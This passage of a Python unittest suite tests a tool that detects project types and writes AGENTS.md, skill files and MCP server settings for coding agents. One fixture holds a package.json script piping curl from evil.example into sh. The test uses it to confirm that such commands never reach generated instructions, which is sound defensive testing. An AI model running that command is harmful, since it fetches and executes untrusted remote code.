            holds({"all": [{"none": [{"file": "a"}]}, {"file": "b"}]}, b=""), "found b"
        )
        self.assertIsNone(holds({"all": [{"file": "a"}, {"file": "b"}]}, b=""))

    def test_package_json_that_is_not_a_file(self):
        work = self.folder("odd-package", **{"go.mod": ""})
        (work / "package.json").mkdir()
        self.assertEqual(kits.detect(work)["suggested"], "general")
        self.assertEqual(kits.detect(work)["evidence"], {"general": ["found go.mod"]})
        self.assertEqual(kits.fill("{{cmd:install}}", work), "TODO: add the command")
        if hasattr(os, "mkfifo"):
            pipe = self.folder("pipe-package")
            os.mkfifo(pipe / "package.json")
            self.assertEqual(kits.detect(pipe)["suggested"], "blank")
            self.assertEqual(kits.fill("{{cmd:test}}", pipe), "TODO: add the command")

    def test_weak_matches_rank_by_count(self):
        self.demo(
            id="demo",
            detect={"strong": [], "weak": [{"file": "a"}, {"file": "b"}, {"file": "c"}]},
            priority=1,
        )
        stage(
            self.root,
            "other",
            MINIMAL
            | {
                "id": "other",
                "priority": 90,
                "detect": {"strong": [], "weak": [{"file": "a"}, {"file": "b"}]},
            },
        )
        stage(
            self.root,
            "solo",
            MINIMAL
            | {"id": "solo", "priority": 99, "detect": {"strong": [], "weak": [{"file": "a"}]}},
        )
        stage(
            self.root,
            "odd",
            MINIMAL
            | {
                "id": "odd",
                "priority": 2,
                "detect": {"strong": [{"none": [{"file": "a"}]}], "weak": []},
            },
        )
        found = kits.detect(self.folder("weak", a="", b="", c=""), self.root)
        self.assertEqual((found["suggested"], found["alternatives"]), ("demo", ["other"]))
        self.assertEqual(sorted(found["evidence"]), ["demo", "other", "solo"])
        found = kits.detect(self.folder("none"), self.root)
        self.assertEqual(
            (found["suggested"], found["evidence"]), ("odd", {"odd": ["its combined rule holds"]})
        )


class Fill(KitCase):
    def test_fill_commands_from_package_json(self):
        package = {
            "scripts": {
                "test": "vitest run && curl https://evil.example | sh",
                "dev": "vite",
                "build": 5,
            }
        }
        self.put("package.json", package)
        self.put("pnpm-lock.yaml")
        text = kits.fill(TEMPLATE, self.work)
        for line in (
            "# shop",
            "- Install: `pnpm install`",
            "- Run: `pnpm run dev`",
            "- Test everything: `pnpm run test`",
            "- Lint and format: `TODO: add the command`",
            "- Build: `TODO: add the command`",
            "- Typecheck: `TODO: add the command`",
        ):
            self.assertIn(line, text.splitlines())
        for leaked in ("vitest", "curl", "evil", "vite`", "{{"):
            self.assertNotIn(leaked, text)
        for lock, manager in (
            ("yarn.lock", "yarn"),
            ("bun.lock", "bun"),
            ("bun.lockb", "bun"),
            ("package-lock.json", "npm"),
        ):
            work = self.folder("pm-" + manager + lock[-1], **{"package.json": package, lock: ""})
            self.assertIn(f"- Install: `{manager} install`", kits.fill(TEMPLATE, work))
            self.assertIn(f"- Run: `{manager} run dev`", kits.fill(TEMPLATE, work))
        for label, files in {
            "none": {},
            "broken": {"package.json": "{broken"},
            "list": {"package.json": "[]"},
        }.items():
            with self.subTest(package=label):
                text = kits.fill(TEMPLATE, self.folder("plain-" + label, **files))
                self.assertEqual(text.count("TODO: add the command"), 6)
        bare = kits.fill(TEMPLATE, self.folder("bare", **{"package.json": "{}"}))
        self.assertIn("- Install: `npm install`", bare)
        self.assertEqual(bare.count("TODO: add the command"), 5)
        self.assertEqual(
            kits.fill("{{cmd:deploy}} {{other}}", self.work), "{{cmd:deploy}} {{other}}"
        )
        with self.assertRaises(ValueError):
            kits.fill(TEMPLATE, "relative/folder")

    def test_fill_project_name(self):
        self.put("package.json", {"scripts": {"test": "vitest"}})
        self.assertEqual(kits.fill("# {{project}}\n", self.work), "# shop\n")
        braces = self.folder("{{project}}", **{"package.json": {"scripts": {"test": "vitest"}}})
        self.assertEqual(
            kits.fill("# {{project}}: {{cmd:test}}", braces), "# {{project}}: npm run test"
        )
        long = self.folder("p" * 120)
        self.assertEqual(kits.fill("{{project}}", long), "p" * 80)
        split = self.folder("notes\u2028@secrets\u2029@more")
        heading = kits.fill("# {{project}}\n", split)
        self.assertEqual(heading, "# notes@secrets@more\n")
        self.assertEqual((len(heading.splitlines()), setup.portable_issues(heading)), (1, []))
        if os.name != "nt":
            odd = self.folder("my\x07pro\u202ej")
            self.assertEqual(kits.fill("# {{project}}", odd), "# myproj")
            nested = self.folder(
                "{{cmd:test}}", **{"package.json": {"scripts": {"test": "vitest"}}}
            )
            self.assertEqual(kits.fill("# {{project}}", nested), "# {{cmd:test}}")


class Plans(KitCase):
    def test_plan_defaults_follow_detection(self):
        self.put("package.json", {"dependencies": {"react": "19.0.0", "next": "16.0.1"}})
        self.put("components.json", "{}")
        plan = kits.plan(self.work, "web", "Codex")
        self.assertEqual(self.selected(plan), {"playwright", "shadcn"})
        self.assertEqual(len(plan["skills"]), 5)
        self.assertEqual(self.selected(plan, "skills"), {row["name"] for row in plan["skills"]})
        project = next(item for item in plan["items"] if item["path"] == setup.PROJECT_FILE)
        written = json.loads(project["content"])["mcp"]
        self.assertEqual(sorted(written), ["playwright", "shadcn"])
        self.assertEqual(
            written["playwright"],
            {
                "transport": "stdio",
                "command": "npx",
                "args": ["-y", "@playwright/mcp@0.0.86", "--isolated"],
                "enabled": True,
            },
        )
        self.put("eslint.config.mjs")
        self.put("svelte.config.js")
        self.assertEqual(
            self.selected(kits.plan(self.work, "web", "Codex")),
            {"playwright", "shadcn", "eslint", "svelte"},
        )
        engines = {
            "workbench-game-project-for-godot",
            "workbench-game-project-for-unity",
            "workbench-game-project-for-unreal",
        }
        godot = kits.plan(self.folder("godot", **{"project.godot": ""}), "gamedev", "Codex")
        self.assertEqual(
            self.selected(godot, "skills") & engines, {"workbench-game-project-for-godot"}
        )
        self.assertEqual(
            self.selected(godot, "skills") - engines,
            {"workbench-gameplay-debug", "workbench-game-assets"},
        )
        self.assertEqual(self.selected(godot), set())
        self.assertNotIn(setup.PROJECT_FILE, self.actions(godot))
        unreal = kits.plan(self.folder("unreal", **{"Game.uproject": "{}"}), "gamedev", "Codex")
        self.assertEqual(
            self.selected(unreal, "skills") & engines, {"workbench-game-project-for-unreal"}
        )
        self.assertEqual(self.selected(unreal), {"unreal"})
        unity = kits.plan(
            self.folder("unity", **{"ProjectSettings/ProjectVersion.txt": ""}), "gamedev", "Codex"
        )
        self.assertEqual(
            self.selected(unity, "skills") & engines, {"workbench-game-project-for-unity"}
        )
        self.assertEqual(self.selected(unity), {"mcp-for-unity"})
        self.assertEqual(
            self.selected(kits.plan(self.folder("ops", **{"main.tf": ""}), "devops", "Codex")),
            set(),
        )
        scene = kits.plan(self.folder("scene"), "3d", "Codex")
        self.assertEqual(
            (self.selected(scene), scene["builtins"]), ({"builtin:blender"}, {"blender": True})
        )

    def test_every_shipped_server_can_be_written(self):
        for kit_id in kits.ORDER:
            listed = shipped(kit_id)["mcp"]
            ids = [entry.get("name") or "builtin:" + entry["builtin"] for entry in listed]
            names = sorted(entry["name"] for entry in listed if "name" in entry)
            caps = {entry["builtin"]: True for entry in listed if "builtin" in entry}
            with self.subTest(kit=kit_id):
                folder = self.folder("all-" + kit_id)
                plan = kits.plan(folder, kit_id, "Codex", servers=ids)
                self.assertEqual(self.selected(plan), set(ids))
                self.assertEqual(plan["builtins"], caps)
                self.assertEqual(setup.PROJECT_FILE in self.actions(plan), bool(names))
                kits.apply(folder, kit_id, "Codex", plan["id"], [setup.PROJECT_FILE], servers=ids)
                found = setup.read_project(folder)
                self.assertEqual((sorted(found["servers"]), found["errors"]), (names, []))
                self.assertEqual(projects.project_mcp(folder), dict.fromkeys(names, True))
                self.assertEqual(projects.folder_view(folder)["recipe"], caps)

    def test_plan_and_apply_through_project_setup(self):
        self.put(
            "package.json", {"dependencies": {"react": "19.0.0"}, "scripts": {"test": "vitest"}}
        )
        self.put("components.json", "{}")
        skills = sorted(
            f".agents/skills/{skill['name']}/SKILL.md" for skill in shipped("web")["skills"]
        )
        plan = kits.plan(self.work, "web", "Codex")
        self.assertEqual(
            [item["path"] for item in plan["items"]], ["AGENTS.md", *skills, setup.PROJECT_FILE]
        )
        self.assertEqual(set(self.actions(plan).values()), {"create"})
        self.assertEqual(
            (plan["kit"], plan["harness"], plan["workspace"]), ("web", "Codex", str(self.work))
        )
        self.assertIn("- Test everything: `npm run test`", plan["agents_md"])
        self.assertEqual(plan["items"][0]["content"], plan["agents_md"])
        self.assertEqual(plan["builtins"], {})
        claude = kits.plan(self.work, "web", "Claude Code")
        mirrored = [path.replace(".agents/", ".claude/") for path in skills]
        self.assertEqual(
            [item["path"] for item in claude["items"]],
            ["AGENTS.md", "CLAUDE.md", *skills, *mirrored, setup.PROJECT_FILE],
        )
        self.assertEqual(claude["items"][1]["content"], "@AGENTS.md\n")
        current = kits.plan(self.work, "web", "Claude Code", cli_version="2.1.330 (Claude Code)")
        self.assertNotIn("CLAUDE.md", self.actions(current))
        with self.assertRaisesRegex(ValueError, "Review it again"):
            kits.apply(self.work, "web", "Claude Code", plan["id"], list(self.actions(claude)))
        self.assertFalse((self.work / "AGENTS.md").exists())
        self.assertEqual(projects.folder_view(self.work)["kit"], "")
        done = kits.apply(self.work, "web", "Claude Code", claude["id"], list(self.actions(claude)))
        self.assertEqual(sorted(done["written"]), sorted(self.actions(claude)))
        self.assertEqual((done["kit"], done["skipped"], done["failed"]), ("web", [], []))
        self.assertEqual(self.text("AGENTS.md"), plan["agents_md"])
        self.assertEqual(self.text("CLAUDE.md"), "@AGENTS.md\n")
        for path in skills:
            self.assertEqual(self.text(path), self.text(path.replace(".agents/", ".claude/")))
            self.assertIn("license: MIT", self.text(path))
        view = projects.folder_view(self.work)
        self.assertEqual(
            (view["kit"], view["project_mcp"]), ("web", {"playwright": True, "shadcn": True})
        )
        self.assertEqual(
            [(server["name"], server["enabled"]) for server in setup.project_servers(self.work)],
            [("playwright", True), ("shadcn", True)],
        )
        self.assertEqual(sorted(projects.written(self.work)), sorted(self.actions(claude)))
        self.assertFalse(done["consent"]["needed"])

        paper = self.folder("paper")
        plan = kits.plan(paper, "research-writing", "Codex")
        self.assertEqual(plan["builtins"], {"search": True, "firecrawl": True})
        self.assertNotIn(setup.PROJECT_FILE, self.actions(plan))
        projects.remember(paper, {"blender": True, "search": False})
        kits.apply(paper, "research-writing", "Codex", plan["id"], [])
        view = projects.folder_view(paper)
        self.assertEqual(view["kit"], "research-writing")
        self.assertEqual(view["recipe"], {"search": True, "firecrawl": True, "blender": True})
        self.assertFalse((paper / "AGENTS.md").exists())

    def test_apply_never_overwrites_user_files(self):
        self.put("AGENTS.md", "# Mine\n\nKeep this.\n")
        mine = {
            "transport": "stdio",
            "command": "npx",
            "args": ["my-own-browser"],
            "enabled": False,
        }
        self.put(setup.PROJECT_FILE, setup.project_text({"playwright": mine}))
        plan = kits.plan(self.work, "web", "Codex")
        actions = self.actions(plan)
        self.assertEqual(actions["AGENTS.md"], "skip")
        agents = plan["items"][0]
        self.assertEqual(agents["reason"], "AGENTS.md already exists. Your file is kept.")
        self.assertIn("-# Mine", agents["diff"])
        self.assertEqual(actions[setup.PROJECT_FILE], "skip")
        done = kits.apply(self.work, "web", "Codex", plan["id"], list(actions))
        self.assertEqual(self.text("AGENTS.md"), "# Mine\n\nKeep this.\n")
        self.assertNotIn("AGENTS.md", done["written"])
        self.assertEqual(len(done["written"]), 5)
        self.assertEqual(
            setup.read_project(self.work)["servers"]["playwright"]["args"], ["my-own-browser"]
        )
        self.assertEqual(projects.project_mcp(self.work), {"playwright": True})
        again = kits.plan(self.work, "web", "Codex")
        self.assertEqual(set(self.actions(again).values()), {"skip"})
        done = kits.apply(self.work, "web", "Codex", again["id"], list(self.actions(again)))
        self.assertEqual((done["written"], done["failed"]), ([], []))
        self.assertEqual(self.text("AGENTS.md"), "# Mine\n\nKeep this.\n")

    def test_preview_names_a_definition_the_folder_keeps(self):
        mine = {
            "transport": "stdio",
            "command": "npx",
            "args": ["-y", "my-own-browser"],
            "enabled": False,
        }
        self.put(setup.PROJECT_FILE, setup.project_text({"playwright": mine}))
        plan = kits.plan(self.work, "web", "Codex", servers=["playwright"], skills=[])
        self.assertEqual(self.actions(plan)[setup.PROJECT_FILE], "skip")
        kept = [text for text in plan["warnings"] if "playwright" in text]
        self.assertEqual(len(kept), 1, plan["warnings"])
        self.assertIn("npx -y my-own-browser", kept[0])
        self.assertIn(setup.PROJECT_FILE, kept[0])
        both = kits.plan(self.work, "web", "Codex", servers=["playwright", "context7"], skills=[])
        self.assertEqual(self.actions(both)[setup.PROJECT_FILE], "update")
        self.assertEqual(len([text for text in both["warnings"] if "my-own-browser" in text]), 1)
        self.assertEqual(plan["id"], kits.plan(self.work, "web", "Codex", ["playwright"], [])["id"])
        other = kits.plan(self.work, "web", "Codex", servers=["context7"], skills=[])
        self.assertEqual(other["warnings"], [])
        kit = next(e for e in shipped("web")["mcp"] if e.get("name") == "playwright")
        self.put(
            setup.PROJECT_FILE,
            setup.project_text({"playwright": launch_fields(kit) | {"enabled": False}}),
        )
        same = kits.plan(self.work, "web", "Codex", servers=["playwright"], skills=[])
        self.assertEqual(same["warnings"], [])
        remote = {"transport": "http", "url": "https://example.com/mcp", "enabled": True}
        self.put(setup.PROJECT_FILE, setup.project_text({"context7": remote}))
        hosted = kits.plan(self.work, "web", "Codex", servers=["context7"], skills=[])
        self.assertEqual(len(hosted["warnings"]), 1)
        self.assertIn("https://example.com/mcp", hosted["warnings"][0])

    def test_missing_tools_are_reported(self):
        with patch.object(kits.shutil, "which", return_value=None) as which:
            plan = kits.plan(self.work, "web", "Codex")
        rows = {row["name"]: row for row in plan["servers"]}
        self.assertEqual(
            (rows["playwright"]["missing"], rows["playwright"]["selected"]), (["node"], True)
        )
        self.assertEqual(rows["context7"]["missing"], [])
        self.assertIn(setup.PROJECT_FILE, self.actions(plan))
        self.assertEqual({call.args[0] for call in which.call_args_list}, {"npx"})
        with patch.object(
            kits.shutil, "which", side_effect=lambda name: "/bin/" + name if name == "uvx" else None
        ):
            plan = kits.plan(self.work, "research-writing", "Codex")
        missing = {row.get("name") or row["builtin"]: row["missing"] for row in plan["servers"]}
        self.assertEqual(
            missing,
            {"search": [], "firecrawl": ["docker"], "fetch": [], "arxiv": [], "markitdown": []},
        )

    def test_requested_choices(self):
        plan = kits.plan(
            self.work,
            "general",
            "Codex",
            servers=["github", "builtin:search"],
            skills=["workbench-small-context"],
        )
        self.assertEqual(self.selected(plan), {"github", "builtin:search"})
        self.assertEqual(plan["builtins"], {"search": True})
        self.assertEqual(self.selected(plan, "skills"), {"workbench-small-context"})
        self.assertEqual(
            sorted(self.actions(plan)),
            sorted(
                [setup.PROJECT_FILE, ".agents/skills/workbench-small-context/SKILL.md", "AGENTS.md"]
            ),
        )
        github = next(row for row in plan["servers"] if row.get("name") == "github")
        self.assertEqual(github["needs"], ["GITHUB_PERSONAL_ACCESS_TOKEN"])
        nothing = kits.plan(self.work, "general", "Codex", servers=[], skills=[])
        self.assertEqual(self.actions(nothing), {"AGENTS.md": "create"})
        for label, kwargs, pattern in (
            (
                "unknown server",
                {"servers": ["playwright"]},
                "That kit does not include playwright.",
            ),
            (
                "unknown skill",
                {"skills": ["workbench-csv"]},
                "That kit does not include workbench-csv.",
            ),
            (
                "unknown built-in",
                {"servers": ["builtin:blender"]},
                "does not include builtin:blender",
            ),
            ("control text", {"servers": ["a\x1b[31mb"]}, r"does not include a\[31mb\."),
            ("not a list", {"servers": "github"}, "Choose the kit's skills and tools"),
            ("not text", {"skills": [5]}, "Choose the kit's skills and tools"),
        ):
            with self.subTest(case=label), self.assertRaisesRegex(ValueError, pattern):
                kits.plan(self.work, "general", "Codex", **kwargs)
        with self.assertRaisesRegex(ValueError, "Choose a supported agent."):
            kits.plan(self.work, "general", "Nope")
        with self.assertRaisesRegex(ValueError, "Choose a starter kit"):
            kits.plan(self.work, "../general", "Codex")
        with self.assertRaisesRegex(ValueError, paths.BAD_FOLDER):
            kits.plan(str(self.tmp / "missing"), "general", "Codex")

    def test_desktop_builtin_only_on_windows(self):
        desktop = {
            "builtin": "desktop",
            "label": "Windows desktop control",
            "default": True,
            "network": "None.",
            "warning": "",
        }
        self.demo(mcp=[desktop])
        with patch.object(kits, "KITS_DIR", self.root):
            with patch.object(kits, "_windows", return_value=False):
                plan = kits.plan(self.work, "demo", "Codex", servers=["builtin:desktop"])
                self.assertEqual((plan["builtins"], self.selected(plan)), ({}, set()))
            with (
                patch.object(kits, "_windows", return_value=True),
                patch.object(projects, "_windows", return_value=True),
            ):
                plan = kits.plan(self.work, "demo", "Codex")
                self.assertEqual(plan["builtins"], {"desktop": True})
                kits.apply(self.work, "demo", "Codex", plan["id"], [])
                self.assertEqual(projects.folder_view(self.work)["recipe"], {"desktop": True})

    def test_dispatch(self):
        self.put("project.godot")
        base = {"workspace": str(self.work), "kit": "gamedev", "harness": "Codex"}
        self.assertEqual([row["id"] for row in kits.dispatch("kit-list", {})], list(kits.ORDER))
        self.assertEqual(kits.dispatch("kit-detect", base)["suggested"], "gamedev")
        plan = kits.dispatch("kit-preview", base | {"servers": ["godot"], "cli_version": "0.171.0"})
        self.assertEqual(self.selected(plan), {"godot"})
        json.dumps(plan)
        done = kits.dispatch(
            "kit-apply",
            base | {"servers": ["godot"], "plan": plan["id"], "confirmed": [setup.PROJECT_FILE]},
        )
        self.assertEqual((done["written"], done["kit"]), ([setup.PROJECT_FILE], "gamedev"))
        self.assertEqual(projects.project_mcp(self.work), {"godot": True})
        json.dumps(done)
        for action, payload in (
            ("kit-nope", base),
            ("project-setup-plan", base),
            ("kit-detect", {}),
            ("kit-preview", {"workspace": str(self.work), "harness": "Codex"}),
            ("kit-preview", base | {"harness": None}),
            ("kit-apply", base),
        ):
            with self.subTest(action=action), self.assertRaises(ValueError):
                kits.dispatch(action, payload)
        with self.assertRaisesRegex(ValueError, "Unknown kit action."):
            kits.dispatch("kit-export", base)


if __name__ == "__main__":
    unittest.main()
